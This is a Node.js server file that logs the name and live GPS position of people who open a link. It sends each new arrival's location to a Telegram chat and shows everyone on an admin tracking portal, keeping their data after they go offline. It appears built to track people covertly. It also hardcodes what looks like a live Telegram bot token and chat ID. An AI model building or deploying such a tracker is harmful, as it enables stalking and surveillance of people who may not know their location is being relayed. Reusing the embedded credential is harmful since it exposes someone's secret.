import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Serve React App
app.use(express.static(path.join(__dirname, 'dist')));

// 1. PERSISTENT STORAGE (In-Memory)
let trackedUsers = {};

// 2. TELEGRAM NOTIFICATION SETTINGS
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8675032884:AAHwrxfA52fcHK69LxDY3q9jem8Ky-aw4Hs';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6670686940';

const sendTelegramAlert = async (name, lat, lng) => {
  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return; // Skip if not set up
  
  // Fixed Google Maps URL here
  const message = `🚨 *NEW CONNECTION* 🚨\n\n*${name}* just shared their location!\n\n📍 [Open in Google Maps](https://maps.google.com/maps?q=${lat},${lng})\n💻 Check your Admin Portal for live tracking.`;
  
  try {
    // Note: This uses native fetch. Ensure you are running Node.js version 18 or above.
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: false
      })
    });
  } catch (err) {
    console.error("Failed to send Telegram alert", err);
  }
};

io.on('connection', (socket) => {
  socket.on('update-location', (userData) => {
    // Check if this is a brand new session or they are coming back online
    const isNewSession = !trackedUsers[userData.userId] || trackedUsers[userData.userId].status === 'offline';
    
    // Store/Update the user data
    trackedUsers[userData.userId] = { 
      ...userData, 
      lastSeen: Date.now(),
      status: 'online' // Mark as active
    };

    // If they just opened the link, send the alert to your Telegram
    if (isNewSession) {
      sendTelegramAlert(userData.name, userData.lat, userData.lng);
    }

    // Broadcast the updated state to the admin
    io.emit('users-list', Object.values(trackedUsers));
  });
});

// Periodic cleanup: Mark as offline if no ping in 2 minutes
setInterval(() => {
  const now = Date.now();
  let stateChanged = false;
  
  Object.keys(trackedUsers).forEach(id => {
    // If they haven't sent a location update in 2 minutes, mark them offline
    if (trackedUsers[id].status === 'online' && (now - trackedUsers[id].lastSeen > 120000)) {
      trackedUsers[id].status = 'offline'; // Keep the data, just mark offline
      stateChanged = true;
    }
  });
  
  if (stateChanged) {
    io.emit('users-list', Object.values(trackedUsers));
  }
}, 10000);

// Catch-all for React Router to handle direct visits to /admin
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
